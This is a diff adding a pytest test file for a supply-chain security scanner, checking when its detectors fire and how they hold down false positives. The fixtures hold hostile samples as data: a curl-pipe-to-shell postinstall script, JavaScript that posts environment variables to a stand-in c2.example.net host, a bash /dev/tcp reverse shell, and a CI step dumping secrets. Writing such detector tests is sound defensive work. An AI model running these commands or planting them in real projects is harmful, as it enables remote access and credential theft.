@@ -1,0 +1,680 @@
+"""Detector behaviour, unit by unit.
+
+The corpus tests prove the detectors work end to end. These prove the specific
+decisions inside them, especially the ones taken to control false positives,
+because those are the decisions most likely to be quietly undone by a later
+change that only looks at recall.
+"""
+
+from __future__ import annotations
+
+import pytest
+
+from cordon_scanner.analysis.shared.obfuscation import ObfuscationDetector
+from cordon_scanner.detect.base import FileUnit, GraphUnit, ScanContext
+from cordon_scanner.detect.code.capability import CapabilityDetector
+from cordon_scanner.detect.infra.config_files import ConfigDetector
+from cordon_scanner.detect.secrets.secrets import SecretDetector
+from cordon_scanner.detect.supply.dependency import DependencyDetector
+from cordon_scanner.detect.supply.lockfile import LockfileDetector
+from cordon_scanner.detect.supply.manifest import ManifestDetector
+from cordon_scanner.foundation.config import Config
+from cordon_scanner.foundation.content import FileContent
+from cordon_scanner.foundation.models import Capability, Category, Dependency, Scope, Severity
+from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+
+class DetectorsFixtures:
+    """Fixtures for the tests in test_detectors.py; every test class here inherits them."""
+
+    @pytest.fixture(scope="module")
+    def rules(self) -> RuleSet:
+        return RuleSet(RuleLoader.load_builtin())
+
+
+class DetectorsHelpers:
+    """Helpers for test_detectors.py."""
+
+    @staticmethod
+    def context(rules: RuleSet, *, hooks: tuple[str, ...] = ()) -> ScanContext:
+        return ScanContext(
+            config=Config.default(),
+            rules=rules,
+            install_hook_paths=frozenset(hooks),
+        )
+
+    @staticmethod
+    def unit(path: str, text: str, language: str | None = None) -> FileUnit:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        return FileUnit(
+            content=FileContent.from_bytes(path, text.encode("utf-8")),
+            language=language or LanguageRegistry.identify_language(path),
+        )
+
+    @staticmethod
+    def run(detector, path: str, text: str, ctx: ScanContext) -> list:
+        return list(detector.inspect(DetectorsHelpers.unit(path, text), ctx))
+
+    # ---------------------------------------------------------------------------
+    # Dependency graph
+    # ---------------------------------------------------------------------------
+
+    @staticmethod
+    def dep(name: str, ecosystem: str = "npm", **kw) -> Dependency:
+        return Dependency(
+            purl=f"pkg:{ecosystem}/{name}@1.0.0",
+            ecosystem=ecosystem,
+            name=name,
+            version="1.0.0",
+            integrity=kw.pop("integrity", "sha512-x"),
+            **kw,
+        )
+
+
+# Payload and credential shapes are assembled rather than written whole. Cordon
+# scans its own repository in CI, and a complete literal here is a true
+# positive: a security tool should not need an exception for itself. None of
+# these values is real.
+LEAKED_TOKEN = "ghp_" + "A" * 36
+PACKER_PREAMBLE = "eval" + "(function(p,a,c,k,e,d){return p}"
+PACKER_SAMPLE = PACKER_PREAMBLE + "('x',1,1,''.split('|')))"
+
+
+# ---------------------------------------------------------------------------
+# Manifest
+# ---------------------------------------------------------------------------
+
+
+class TestManifestDetector(DetectorsFixtures):
+    def test_fetch_and_execute_install_script_is_malicious(self, rules) -> None:
+        findings = DetectorsHelpers.run(
+            ManifestDetector(),
+            "package.json",
+            '{"name":"x","scripts":{"postinstall":"curl -s https://x.example/i.sh | sh"}}',
+            DetectorsHelpers.context(rules),
+        )
+        assert any(
+            f.category is Category.MALICIOUS and f.severity is Severity.CRITICAL for f in findings
+        )
+
+    def test_an_ordinary_build_script_is_not_reported(self, rules) -> None:
+        findings = DetectorsHelpers.run(
+            ManifestDetector(),
+            "package.json",
+            '{"name":"x","scripts":{"build":"tsc","test":"jest"}}',
+            DetectorsHelpers.context(rules),
+        )
+        assert findings == []
+
+    def test_a_benign_prepare_script_is_not_reported(self, rules) -> None:
+        """`prepare` is a lifecycle hook, but running a local script in one is
+        ordinary. Only the hostile primitives inside it matter."""
+        findings = DetectorsHelpers.run(
+            ManifestDetector(),
+            "package.json",
+            '{"name":"x","scripts":{"prepare":"husky install"}}',
+            DetectorsHelpers.context(rules),
+        )
+        assert findings == []
+
+    def test_non_registry_dependency_is_policy_not_malware(self, rules) -> None:
+        """The finding says the safety net is absent, not that something is
+        wrong. Categorising it as malicious would be an overclaim."""
+        findings = DetectorsHelpers.run(
+            ManifestDetector(),
+            "package.json",
+            '{"name":"x","dependencies":{"lib":"git+ssh://git@github.com/a/b.git"}}',
+            DetectorsHelpers.context(rules),
+        )
+        assert [f.category for f in findings] == [Category.POLICY]
+
+    def test_unparseable_manifest_is_reported_as_operational(self, rules) -> None:
+        """A manifest that could not be read is one whose contents were not
+        checked, and that must never resemble a pass."""
+        findings = DetectorsHelpers.run(
+            ManifestDetector(), "package.json", "{ not json", DetectorsHelpers.context(rules)
+        )
+        assert [f.category for f in findings] == [Category.OPERATIONAL]
+
+    def test_evidence_is_masked(self, rules) -> None:
+        """A lifecycle command is one of the likelier places for a credential to
+        sit inline."""
+        findings = DetectorsHelpers.run(
+            ManifestDetector(),
+            "package.json",
+            '{"name":"x","scripts":{"postinstall":'
+            f'"curl -H \\"Authorization: {LEAKED_TOKEN}\\" u | sh"}}}}',
+            DetectorsHelpers.context(rules),
+        )
+        for finding in findings:
+            assert LEAKED_TOKEN not in (finding.evidence.snippet or "")
+
+    def test_non_manifest_files_are_ignored(self, rules) -> None:
+        assert (
+            DetectorsHelpers.run(
+                ManifestDetector(), "src/app.js", "const x = 1;", DetectorsHelpers.context(rules)
+            )
+            == []
+        )
+
+
+# ---------------------------------------------------------------------------
+# Lockfile
+# ---------------------------------------------------------------------------
+
+
+HASHED_LOCK = """
+{"lockfileVersion":3,"packages":{
+  "":{"name":"d"},
+  "node_modules/a":{"version":"1.0.0","integrity":"sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==",
+    "resolved":"https://registry.npmjs.org/a/-/a-1.0.0.tgz"},
+  "node_modules/b":{"version":"2.0.0","integrity":"sha512-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB==",
+    "resolved":"https://registry.npmjs.org/b/-/b-2.0.0.tgz"}
+}}
+"""
+
+
+class TestLockfileDetector(DetectorsFixtures):
+    def test_fully_hashed_registry_lockfile_is_quiet(self, rules) -> None:
+        assert (
+            DetectorsHelpers.run(
+                LockfileDetector(),
+                "package-lock.json",
+                HASHED_LOCK,
+                DetectorsHelpers.context(rules),
+            )
+            == []
+        )
+
+    def test_a_missing_hash_among_hashed_entries_is_reported(self, rules) -> None:
+        text = HASHED_LOCK.replace(
+            '"integrity":"sha512-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB==",\n    ',
+            "",
+        )
+        findings = DetectorsHelpers.run(
+            LockfileDetector(), "package-lock.json", text, DetectorsHelpers.context(rules)
+        )
+        assert any(f.rule_id == "POLICY.LOCKFILE.INTEGRITY.001" for f in findings)
+
+    def test_non_registry_entries_are_excluded_from_the_integrity_check(self, rules) -> None:
+        """A git dependency has no registry hash to carry. Counting it as
+        missing one reports a fact of the format as an anomaly, and it is
+        already reported accurately by the provenance rule."""
+        text = HASHED_LOCK.replace(
+            '"node_modules/b":{"version":"2.0.0","integrity":"sha512-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB==",\n'
+            '    "resolved":"https://registry.npmjs.org/b/-/b-2.0.0.tgz"}',
+            '"node_modules/b":{"version":"2.0.0","resolved":"git+ssh://git@github.com/a/b.git"}',
+        )
+        findings = DetectorsHelpers.run(
+            LockfileDetector(), "package-lock.json", text, DetectorsHelpers.context(rules)
+        )
+        ids = {f.rule_id for f in findings}
+        assert "SUSPECT.LOCKFILE.SOURCE.001" in ids
+        assert "POLICY.LOCKFILE.INTEGRITY.001" not in ids
+
+    @pytest.mark.parametrize(
+        ("resolved", "severity"),
+        [
+            ("git+ssh://git@github.com/a/b.git", Severity.LOW),
+            ("https://codeload.github.com/a/b/tar.gz/v2.0.0", Severity.LOW),
+            ("https://packages.example.net/b-2.0.0.tgz", Severity.MEDIUM),
+        ],
+    )
+    def test_a_code_host_is_recorded_and_an_unknown_host_warned(
+        self, rules, resolved: str, severity: Severity
+    ) -> None:
+        text = HASHED_LOCK.replace(
+            '"resolved":"https://registry.npmjs.org/b/-/b-2.0.0.tgz"', f'"resolved":"{resolved}"'
+        )
+        findings = DetectorsHelpers.run(
+            LockfileDetector(), "package-lock.json", text, DetectorsHelpers.context(rules)
+        )
+        found = [f for f in findings if f.rule_id == "SUSPECT.LOCKFILE.SOURCE.001"]
+        assert [f.severity for f in found] == [severity]
+
+    def test_an_unpinned_requirements_file_is_not_a_lockfile(self, rules) -> None:
+        """It matches the glob and legitimately resolves nothing, so silence is
+        correct rather than a finding."""
+        assert (
+            DetectorsHelpers.run(
+                LockfileDetector(),
+                "requirements.txt",
+                "requests>=2.0\n",
+                DetectorsHelpers.context(rules),
+            )
+            == []
+        )
+
+    def test_findings_are_summarised_not_one_per_package(self, rules) -> None:
+        """One finding per unverified package turns a single misconfiguration
+        into hundreds of alerts."""
+        entries = ",".join(f'"node_modules/p{i}":{{"version":"1.0.0"}}' for i in range(50))
+        text = '{"lockfileVersion":3,"packages":{"":{"name":"d"},' + entries + "}}"
+        findings = DetectorsHelpers.run(
+            LockfileDetector(), "package-lock.json", text, DetectorsHelpers.context(rules)
+        )
+        assert len(findings) <= 2
+
+
+class TestDependencyDetector(DetectorsFixtures):
+    def graph(self, rules, *deps):
+        ctx = ScanContext(config=Config.default(), rules=rules, dependencies=tuple(deps))
+        return list(DependencyDetector().inspect(GraphUnit(dependencies=tuple(deps)), ctx))
+
+    def test_typosquat_is_detected(self, rules) -> None:
+        findings = self.graph(rules, DetectorsHelpers.dep("lodahs"))
+        assert any(f.rule_id == "SUSPECT.DEPENDENCY.TYPOSQUAT.001" for f in findings)
+
+    def test_the_real_package_is_not_flagged(self, rules) -> None:
+        assert self.graph(rules, DetectorsHelpers.dep("lodash")) == []
+
+    def test_a_real_neighbour_is_not_flagged(self, rules) -> None:
+        """`preact` sits one edit from `react` and is an entirely separate
+        project. A check that cannot tell them apart gets disabled."""
+        assert self.graph(rules, DetectorsHelpers.dep("preact")) == []
+
+    def test_short_names_are_not_compared(self, rules) -> None:
+        """Below four characters almost every name is within two edits of some
+        other name, so the check yields noise rather than signal."""
+        assert self.graph(rules, DetectorsHelpers.dep("ms")) == []
+
+    def test_non_registry_source_is_reported(self, rules) -> None:
+        findings = self.graph(
+            rules, DetectorsHelpers.dep("internal", resolved_from="git+ssh://git@host/x.git")
+        )
+        assert any(f.rule_id == "SUSPECT.DEPENDENCY.SOURCE.001" for f in findings)
+
+    def test_depth_lowers_the_score(self, rules) -> None:
+        shallow = self.graph(rules, DetectorsHelpers.dep("lodahs", depth=0, direct=True))
+        deep = self.graph(rules, DetectorsHelpers.dep("lodahs", depth=5))
+        assert shallow[0].risk.value > deep[0].risk.value
+
+    def test_dev_scope_lowers_the_score(self, rules) -> None:
+        runtime = self.graph(rules, DetectorsHelpers.dep("lodahs", scope=Scope.RUNTIME))
+        development = self.graph(rules, DetectorsHelpers.dep("lodahs", scope=Scope.DEV))
+        assert development[0].risk.value < runtime[0].risk.value
+
+    def test_findings_are_located_by_package_not_path(self, rules) -> None:
+        findings = self.graph(rules, DetectorsHelpers.dep("lodahs"))
+        assert findings[0].location.package == "pkg:npm/lodahs@1.0.0"
+
+
+# ---------------------------------------------------------------------------
+# Secrets
+# ---------------------------------------------------------------------------
+
+
+class TestSecretDetector(DetectorsFixtures):
+    def test_multiple_distinct_secrets_in_one_file_are_all_found(self, rules) -> None:
+        """A regression guard. Reusing a variable name in the match loop rebound
+        the file content to the matched token, so everything after the first
+        secret silently stopped being found."""
+        text = (
+            'AWS = "AKIA' + "Q" * 16 + '"\n'
+            'GH = "ghp_' + "b" * 36 + '"\n'
+            'STRIPE = "sk_live_' + "c" * 24 + '"\n'
+            'NPM = "npm_' + "d" * 36 + '"\n'
+        )
+        findings = DetectorsHelpers.run(
+            SecretDetector(), "conf.py", text, DetectorsHelpers.context(rules)
+        )
+        assert len(findings) >= 4, [f.rule_id for f in findings]
+
+    def test_placeholders_are_not_reported(self, rules) -> None:
+        text = (
+            'key = "your-api-key-here"\n'
+            'pw = "changeme"\n'
+            'k = "AKIAIOSFODNN7EXAMPLE"\n'
+            'sha = "d41d8cd98f00b204e9800998ecf8427e"\n'
+        )
+        assert (
+            DetectorsHelpers.run(SecretDetector(), "conf.py", text, DetectorsHelpers.context(rules))
+            == []
+        )
+
+    def test_named_environment_reads_are_not_secrets(self, rules) -> None:
+        text = 'API_KEY = os.environ["API_KEY"]\nTOKEN = os.getenv("TOKEN")\n'
+        assert (
+            DetectorsHelpers.run(
+                SecretDetector(), "settings.py", text, DetectorsHelpers.context(rules)
+            )
+            == []
+        )
+
+    def test_evidence_is_always_hash_only(self, rules) -> None:
+        """Not overridable. A finding must never be the thing that copies a
+        credential into a log."""
+        secret = "ghp_" + "e" * 36
+        findings = DetectorsHelpers.run(
+            SecretDetector(), "conf.py", f'T = "{secret}"\n', DetectorsHelpers.context(rules)
+        )
+        assert findings
+        for finding in findings:
+            assert finding.evidence.snippet is None
+            assert finding.evidence.match_hash
+
+    def test_no_path_is_exempt(self, rules) -> None:
+        """A committed .env is the single case a secret scanner exists for."""
+        secret = "ghp_" + "f" * 36
+        for path in (".env", "secrets/prod.pem", "vendor/x.key", "node_modules/a.js"):
+            assert DetectorsHelpers.run(
+                SecretDetector(), path, f'T="{secret}"\n', DetectorsHelpers.context(rules)
+            ), path
+
+    def test_binary_files_are_skipped(self, rules) -> None:
+        assert (
+            DetectorsHelpers.run(
+                SecretDetector(), "x.png", "\x00\x00binary", DetectorsHelpers.context(rules)
+            )
+            == []
+        )
+
+
+# ---------------------------------------------------------------------------
+# Obfuscation
+# ---------------------------------------------------------------------------
+
+
+class TestObfuscationDetector(DetectorsFixtures):
+    def test_escape_runs_are_reported(self, rules) -> None:
+        host = "".join(f"\\x{ord(c):02x}" for c in "evil.example.net")
+        findings = DetectorsHelpers.run(
+            ObfuscationDetector(), "a.js", f'const h="{host}";', DetectorsHelpers.context(rules)
+        )
+        assert any(f.rule_id == "SUSPECT.OBFUSCATION.ENCODED.001" for f in findings)
+
+    @pytest.mark.parametrize(
+        "plain",
+        [
+            "0123456789ABCDEF",  # curl's hex digits
+            "DOWNGRD\x01",  # a TLS protocol constant
+            "OpenTimestamps",  # a file-format signature
+            "!#$%&'*+-.^_`|~",  # a regular expression's character range
+        ],
+    )
+    def test_data_written_as_escapes_is_not_concealment(self, rules, plain: str) -> None:
+        escaped = "".join(f"\\x{ord(c):02x}" for c in plain)
+        findings = DetectorsHelpers.run(
+            ObfuscationDetector(), "a.js", f'const t="{escaped}";', DetectorsHelpers.context(rules)
+        )
+        assert not any(f.rule_id == "SUSPECT.OBFUSCATION.ENCODED.001" for f in findings)
+
+    def test_a_module_name_written_as_escapes_is(self, rules) -> None:
+        escaped = "".join(f"\\x{ord(c):02x}" for c in "child_process")
+        findings = DetectorsHelpers.run(
+            ObfuscationDetector(), "a.js", f'const m="{escaped}";', DetectorsHelpers.context(rules)
+        )
+        assert any(f.rule_id == "SUSPECT.OBFUSCATION.ENCODED.001" for f in findings)
+
+    def test_bidi_characters_are_reported_without_a_snippet(self, rules) -> None:
+        """Rendering the snippet would reproduce the exact problem being
+        reported."""
+        findings = DetectorsHelpers.run(
+            ObfuscationDetector(),
+            "a.js",
+            "if (x) { /* \u202e */ }",
+            DetectorsHelpers.context(rules),
+        )
+        assert findings
+        assert findings[0].rule_id == "SUSPECT.OBFUSCATION.BIDI.001"
+        assert findings[0].evidence.snippet is None
+
+    def test_packer_output_is_reported(self, rules) -> None:
+        findings = DetectorsHelpers.run(
+            ObfuscationDetector(),
+            "a.js",
+            PACKER_SAMPLE,
+            DetectorsHelpers.context(rules),
+        )
+        assert any(f.rule_id == "SUSPECT.OBFUSCATION.PACKED.001" for f in findings)
+
+    def test_minified_files_are_exempt_from_the_length_rule(self, rules) -> None:
+        """Minified bundles are entirely made of long lines. A rule that fires
+        on them is unusable on any front end."""
+        long_line = "".join(f"function f{i}(a){{return a+{i}}};" for i in range(400))
+        findings = DetectorsHelpers.run(
+            ObfuscationDetector(), "vendor.min.js", long_line, DetectorsHelpers.context(rules)
+        )
+        assert not [f for f in findings if f.rule_id == "SUSPECT.OBFUSCATION.LONGLINE.001"]
+
+    def test_ordinary_code_is_quiet(self, rules) -> None:
+        text = "export function add(a, b) {\n  return a + b;\n}\n"
+        assert (
+            DetectorsHelpers.run(
+                ObfuscationDetector(), "a.js", text, DetectorsHelpers.context(rules)
+            )
+            == []
+        )
+
+    def test_low_entropy_long_lines_are_not_reported(self, rules) -> None:
+        """A long data line is repetitive; a payload is not."""
+        text = "const data = [" + ",".join("0" for _ in range(3000)) + "];"
+        findings = DetectorsHelpers.run(
+            ObfuscationDetector(), "a.js", text, DetectorsHelpers.context(rules)
+        )
+        assert not [f for f in findings if f.rule_id == "SUSPECT.OBFUSCATION.LONGLINE.001"]
+
+
+# ---------------------------------------------------------------------------
+# Capability and context
+# ---------------------------------------------------------------------------
+
+
+EXFIL_JS = (
+    "const { execSync } = require('child_process');\n"
+    "const e = JSON.stringify(process.env);\n"
+    "fetch('https://c2.example.net/i', { method: 'POST', body: e });\n"
+    "execSync('true');\n"
+)
+
+
+class TestCapabilityDetector(DetectorsFixtures):
+    def test_capabilities_combine_into_a_finding(self, rules) -> None:
+        findings = DetectorsHelpers.run(
+            CapabilityDetector(), "a.js", EXFIL_JS, DetectorsHelpers.context(rules)
+        )
+        assert any(f.rule_id == "SUSPECT.EXFIL.001" for f in findings)
+
+    def test_a_single_capability_produces_nothing(self, rules) -> None:
+        """Labels are observations, not accusations. Reporting them
+        individually would be pure noise."""
+        assert (
+            DetectorsHelpers.run(
+                CapabilityDetector(),
+                "a.js",
+                "await fetch('/api/users');\n",
+                DetectorsHelpers.context(rules),
+            )
+            == []
+        )
+
+    def test_install_context_escalates_to_malicious(self, rules) -> None:
+        ctx = DetectorsHelpers.context(rules, hooks=("install.js",))
+        findings = DetectorsHelpers.run(CapabilityDetector(), "install.js", EXFIL_JS, ctx)
+        assert any(f.category is Category.MALICIOUS for f in findings)
+
+    def test_the_same_code_outside_a_hook_is_only_suspicious(self, rules) -> None:
+        findings = DetectorsHelpers.run(
+            CapabilityDetector(), "app.js", EXFIL_JS, DetectorsHelpers.context(rules)
+        )
+        assert findings
+        assert all(f.category is not Category.MALICIOUS for f in findings)
+
+    def test_test_files_are_exempt_from_the_dropper_rule(self, rules) -> None:
+        """Test files legitimately fetch fixtures and run assertions in one
+        place."""
+        text = "await fetch(u);\nexecSync('true');\n"
+        findings = DetectorsHelpers.run(
+            CapabilityDetector(), "src/api.test.js", text, DetectorsHelpers.context(rules)
+        )
+        assert not [f for f in findings if f.rule_id == "SUSPECT.DROPPER.001"]
+
+    def test_binary_files_are_skipped(self, rules) -> None:
+        assert (
+            DetectorsHelpers.run(
+                CapabilityDetector(),
+                "a.png",
+                "\x00\x00" + EXFIL_JS,
+                DetectorsHelpers.context(rules),
+            )
+            == []
+        )
+
+    def test_capabilities_are_recorded_on_the_finding(self, rules) -> None:
+        findings = DetectorsHelpers.run(
+            CapabilityDetector(), "a.js", EXFIL_JS, DetectorsHelpers.context(rules)
+        )
+        exfil = next(f for f in findings if f.rule_id == "SUSPECT.EXFIL.001")
+        assert Capability.CREDENTIAL in exfil.capabilities
+        assert Capability.EGRESS in exfil.capabilities
+
+
+# ---------------------------------------------------------------------------
+# Configuration files
+# ---------------------------------------------------------------------------
+
+
+class TestConfigDetector(DetectorsFixtures):
+    def test_secret_context_serialisation_is_malicious(self, rules) -> None:
+        findings = DetectorsHelpers.run(
+            ConfigDetector(),
+            ".github/workflows/x.yml",
+            "jobs:\n  a:\n    steps:\n      - run: echo '${{ toJSON(secrets) }}'\n",
+            DetectorsHelpers.context(rules),
+        )
+        assert any(f.category is Category.MALICIOUS for f in findings)
+
+    def test_a_correct_workflow_is_quiet(self, rules) -> None:
+        text = (
+            "on: [pull_request]\n"
+            "jobs:\n  test:\n    steps:\n"
+            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n"
+            "      - run: pytest\n"
+            "        env:\n          T: ${{ secrets.TOKEN }}\n"
+        )
+        assert (
+            DetectorsHelpers.run(
+                ConfigDetector(), ".github/workflows/ci.yml", text, DetectorsHelpers.context(rules)
+            )
+            == []
+        )
+
+    def test_unpinned_action_is_reported(self, rules) -> None:
+        findings = DetectorsHelpers.run(
+            ConfigDetector(),
+            ".github/workflows/x.yml",
+            "steps:\n  - uses: some-org/some-action@main\n",
+            DetectorsHelpers.context(rules),
+        )
+        assert any(f.rule_id == "POLICY.CI.UNPINNED_ACTION.001" for f in findings)
+
+    def test_first_party_actions_are_not_flagged_as_unpinned(self, rules) -> None:
+        """GitHub's own actions are excluded deliberately: requiring a SHA for
+        them produces noise on every repository without changing who is
+        trusted."""
+        findings = DetectorsHelpers.run(
+            ConfigDetector(),
+            ".github/workflows/x.yml",
+            "steps:\n  - uses: actions/checkout@v4\n",
+            DetectorsHelpers.context(rules),
+        )
+        assert not [f for f in findings if f.rule_id == "POLICY.CI.UNPINNED_ACTION.001"]
+
+    def test_digest_pinned_base_image_is_quiet(self, rules) -> None:
+        text = "FROM python:3.12-slim@sha256:" + "a" * 64 + "\nCOPY . .\n"
+        findings = DetectorsHelpers.run(
+            ConfigDetector(), "Dockerfile", text, DetectorsHelpers.context(rules)
+        )
+        assert not [f for f in findings if f.rule_id == "POLICY.CONTAINER.UNPINNED_BASE.001"]
+
+    def test_rules_only_apply_to_their_own_file_types(self, rules) -> None:
+        """A Dockerfile rule must not fire on application source."""
+        findings = DetectorsHelpers.run(
+            ConfigDetector(),
+            "src/app.py",
+            "cidr_blocks = ['0.0.0.0/0']",
+            DetectorsHelpers.context(rules),
+        )
+        assert findings == []
+
+
+class TestIdentifyingALanguageWithoutAFilename(DetectorsFixtures):
+    """Identification was the filename, then the shebang, and nothing else.
+
+    A file with neither got `language=None`, which means none of the language
+    rules ran on it -- so a bash reverse shell in a file called `postinstall`,
+    or in `payload.dat`, was invisible while the identical bytes in
+    `postinstall.sh` were CRITICAL. That is a one-rename bypass of every
+    behavioural rule the tool has, and a `package.json` declaring
+    `"postinstall": "./postinstall"` is how such a file gets run.
+    """
+
+    REVERSE_SHELL = "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n"
+
+    def test_an_extensionless_script_is_identified_by_shape(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        assert LanguageRegistry.identify_from_content(self.REVERSE_SHELL) == "shell"
+
+    def test_python_is_identified_by_shape(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        source = "import socket, subprocess\ndef go(host):\n    return socket.socket()\n"
+        assert LanguageRegistry.identify_from_content(source) == "python"
+
+    def test_javascript_is_identified_by_shape(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        source = 'const net = require("net");\nmodule.exports = { go };\n'
+        assert LanguageRegistry.identify_from_content(source) == "javascript"
+
+    def test_one_marker_is_not_enough(self) -> None:
+        """A single marker is noise: the word import appears in prose about
+        Python, and a redirection appears in a build log. Two of them in one
+        file is a shape data does not have."""
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        assert LanguageRegistry.identify_from_content("see the import section\n") is None
+        assert LanguageRegistry.identify_from_content("job failed with 2>&1\n") is None
+
+    def test_prose_and_data_are_not_code(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        for text in (
+            "This project is a library for parsing dates.\n\nIt has no dependencies.\n",
+            '{"name": "thing", "version": "1.0.0"}\n',
+            "id,name,total\n1,alpha,3\n2,beta,4\n",
+            "",
+        ):
+            assert LanguageRegistry.identify_from_content(text) is None
+
+    def test_the_filename_always_wins(self) -> None:
+        """A markdown file is never re-read as shell however much shell it
+        contains. A README documenting an install one-liner that pipes a
+        download into a shell is the single most common shape in open-source
+        documentation, and reading it as a script would report every install
+        guide ever written."""
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        assert LanguageRegistry.identify("README.md", text=self.REVERSE_SHELL) == "markdown"
+        assert (
+            LanguageRegistry.identify("x.py", text='const a = require("b");\nmodule.exports = a;\n')
+            == "python"
+        )
+
+    def test_the_shebang_still_beats_the_shape(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        identified = LanguageRegistry.identify(
+            "installer", shebang="#!/usr/bin/env python3", text=self.REVERSE_SHELL
+        )
+        assert identified == "python"
+
+    def test_no_evidence_is_not_a_guess(self) -> None:
+        """Returning something for a file that looks like nothing points a
+        whole language's rules at content that is not that language, which is
+        a worse answer than none."""
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        assert LanguageRegistry.identify_from_content("x" * 200) is None
